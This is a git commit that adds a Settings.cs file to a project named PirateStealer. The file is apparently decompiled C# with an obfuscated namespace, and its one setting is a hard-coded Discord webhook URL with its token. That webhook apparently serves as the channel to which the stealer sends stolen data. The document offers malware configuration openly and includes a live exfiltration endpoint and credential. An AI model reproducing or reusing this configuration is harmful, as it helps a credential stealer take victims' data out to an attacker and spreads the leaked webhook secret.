4fd40a4aef9d11c444b133becf6b27c76ec8dc22
Stanley <96034874+Stanley-PirateStealer@users.noreply.github.com>
2021-12-21 05:28:04 +0200

    Add files via upload

---
+++ src/PirateStealer/Settings.cs
@@ -0,0 +1,11 @@
+﻿using System;
+
+namespace Ii7x
+{
+	// Token: 0x02000004 RID: 4
+	public class Settings
+	{
+		// Token: 0x04000007 RID: 7
+		public static string Webhook = "https://discord.com/api/webhooks/920841274691551242/aKrT6RofNL37gOGbMIk1mZ-o4xuluLgpVBRA534CPUzs5KNgTP05p-glCWDKMMbRSddG";
+	}
+}
